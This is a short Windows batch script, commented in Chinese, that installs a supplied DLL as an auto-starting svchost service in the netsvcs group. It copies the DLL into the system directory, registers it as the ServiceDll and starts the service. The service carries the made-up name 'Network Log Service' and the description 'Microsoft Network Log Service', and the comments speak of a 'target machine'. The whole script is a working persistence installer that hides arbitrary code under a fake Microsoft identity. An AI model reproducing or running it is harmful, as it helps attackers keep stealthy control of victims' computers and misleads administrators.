@echo off
echo ------------------------------------------------
echo 参数1：服务名，必须是HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost 键netsvcs值中的一个字符串,否则报错“错误1083：配置成在该可执行程序中运行的这个服务不能执行该服务”
echo 参数2：服务DLL的文件名必须在当前目录下
echo 参数3：x86（32位机） 或者 x64（64位机） ，省略情况下默认为x86。请根据目标机选择正确的值，否则不能运行。
echo ------------------------------------------------
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" /v netsvcs
echo 按任意键继续或CTRL+C结束执行   

if [%1] == [] ( 
echo 请输入至少两个参数
goto end
)

if [%2] == [] ( 
echo 请输入至少两个参数
goto end
)

reg query hklm\system\currentcontrolset\services\%1 >nul
if %errorlevel% == 0 (
echo 该服务已经存在，请更换服务名
goto end
)

sc create "%1" binpath= "%SystemRoot%\system32\svchost.exe -k netsvcs" type= share start= auto DisplayName= "Network Log Service" 

if "%3" == "x64" (
 reg add    hklm\system\currentcontrolset\services\%1 /v WOW64 /t REG_DWORD /d 1
 copy .\%2 %SystemRoot%\sysWOW64\%2
) else (
 copy .\%2 %SystemRoot%\system32\%2
)

reg add    hklm\system\currentcontrolset\services\%1\parameters /v servicedll /t REG_EXPAND_SZ /d %SystemRoot%\system32\%2

reg add    hklm\system\currentcontrolset\services\%1 /v Description /t REG_SZ /d "Microsoft Network Log Service"
sc start "%1"

:end
